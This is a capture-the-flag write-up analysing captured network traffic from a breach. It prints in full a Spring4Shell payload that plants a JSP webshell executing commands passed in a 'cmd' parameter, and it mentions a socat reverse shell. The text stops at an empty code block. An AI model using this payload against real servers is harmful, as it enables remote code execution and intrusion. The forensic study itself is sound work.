# Wrong Spooky Season

## Background

> "I told them it was too soon and in the wrong season to deploy such a website, but they assured me that theming it properly would be enough to stop the ghosts from haunting us. I was wrong." Now there is an internal breach in the `Spooky Network` and you need to find out what happened. Analyze the the network traffic and find how the scary ghosts got in and what they did.

> Difficulty: Easy

- Overall difficulty for me: Very easy

**It's a `pcap` file! Let's open it in WireShark!**

**That's a lot of HTTP packets! Let's filter HTTP all requests!**

**The attacker (`192.168.1.180`) looks like has sent a POST request, which uploaded a JSP reverse shell on the web server!**

**In the second POST request, I see this:**

**Let's URL decode that in CyberChef:**

```java
class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{prefix}i java.io.InputStream in = %{c}i.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } %{suffix}i&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=e4d1c32a56ca15b3&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
```

**After some googling, this is a Spring4Shell payload!**

**In the last HTTP GET request, we can see that the threat actor is installing `socat` in the victim system, and use that as a reverse shell!**

**Now, we can go to the last TCP stream to see what the threat actor did:**

**That reversed `base64` string looks sussy! Let's decode that:**
```
